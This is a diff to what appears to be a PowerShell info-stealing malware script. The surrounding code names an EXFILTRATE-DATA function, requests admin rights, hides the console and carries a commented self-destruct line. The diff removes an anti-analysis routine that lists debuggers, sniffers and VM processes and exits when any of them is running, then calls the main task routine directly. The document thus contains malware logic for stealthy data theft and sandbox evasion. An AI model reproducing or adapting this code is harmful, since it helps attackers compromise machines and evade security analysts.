@@ -112,7 +112,7 @@ function EXFILTRATE-DATA {
         if ($disk.Size -gt 0) {
             $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
             $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
-    		$usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
+            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
             [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
 			[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
             [PSCustomObject]@{
@@ -285,60 +285,6 @@ function Request-Admin {
     }
 }
 
-function Invoke-ANTIVM {
-
- function antivm
- {
-   "autoruns"
-   "autorunsc"
-   "dumpcap"
-   "Fiddler"
-   "fakenet"
-   "HookExplorer"
-   "ImmunityDebugger"
-   "httpdebugger"
-   "ImportREC"
-   "LordPE"
-   "PETools"
-   "ProcessHacker"
-   "ResourceHacker"
-   "Scylla_x64"
-   "sandman"
-   "SysInspector"
-   "tcpview"
-   "die"
-   "dumpcap"
-   "filemon"
-   "idaq"
-   "idaq64"
-   "joeboxcontrol"
-   "joeboxserver"
-   "ollydbg"
-   "proc_analyzer"
-   "procexp"
-   "procmon"
-   "regmon"
-   "sniff_hit"
-   "sysAnalyzer"
-   "tcpview"
-   "windbg"
-   "Wireshark"
-   "x32dbg"
-   "x64dbg"
-   "Vmwareuser"
-   "Vmacthlp"
-   "vboxservice"
-   "vboxtray"
- }
-$processnames = antivm
-if(($processnames | ForEach-Object {Get-Process -Name $_ -ea SilentlyContinue}) -eq $null){ 
-   Invoke-TASKS  
-}
-else{ 
-  exit
-}
-}
-
 function Hide-Console
 {
     if (-not ("Console.Window" -as [type])) { 
@@ -356,7 +302,7 @@ function Hide-Console
 
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
-    Invoke-ANTIVM
+    Invoke-TASKS
     # Self-Destruct
 	# Remove-Item $PSCommandPath -Force 
 } else {
